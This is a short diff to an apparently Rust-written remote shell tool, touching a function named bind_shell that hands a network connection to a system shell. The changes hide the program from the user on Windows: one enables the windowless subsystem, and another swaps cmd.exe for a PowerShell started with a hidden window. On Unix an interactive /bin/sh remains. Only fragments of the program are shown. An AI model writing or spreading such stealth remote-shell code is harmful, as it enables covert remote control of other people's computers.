@@ -1,4 +1,4 @@
-// #![windows_subsystem = "windows"]
+#![windows_subsystem = "windows"]
 
 mod config;
 mod setting;
@@ -177,7 +177,8 @@ fn bind_shell(stream: TcpStream) -> Result<(), Box<dyn error::Error>> {
     let mut args: Vec<&str> = Vec::new();
 
     let shell = if cfg!(windows) {
-        "cmd.exe"
+        args.extend(["-WindowStyle", "Hidden"]);
+        "powershell"
     } else {
         args.push("-i");
         "/bin/sh"
